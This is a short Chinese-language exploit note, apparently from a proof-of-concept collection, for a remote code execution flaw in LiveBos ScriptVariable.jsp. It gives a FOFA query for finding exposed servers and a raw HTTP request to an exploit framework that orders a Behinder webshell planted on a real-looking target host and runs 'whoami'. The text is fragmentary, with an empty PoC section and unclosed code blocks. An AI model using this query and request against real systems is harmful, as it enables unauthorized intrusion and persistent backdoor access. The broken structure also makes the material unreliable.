# LiveBos ScriptVariable.jsp 远程代码执行漏洞

    ## fofa

```
body="LiveBos" || body="/react/browser/loginBackground.png"
```

## poc

写入冰蝎

### 1

```

## exp

```
POST /api/v1/debugExp HTTP/1.1
Content-Type: application/json;charset=UTF-8
Authorization: Basic dXNlcjpwYXNz
host: 82.156.29.211:8365
Connection: close
Content-Length: 207

{"hostinfo":"http://item.tpre.cn:9999","vulfile":"CVD-2023-2800.go","expparams":{"attackType":"webshell","cmd":"whoami","webshell":"behinder","filename":"abcsj.jsp","content":"<% out.println(\"hello\");%>"}}
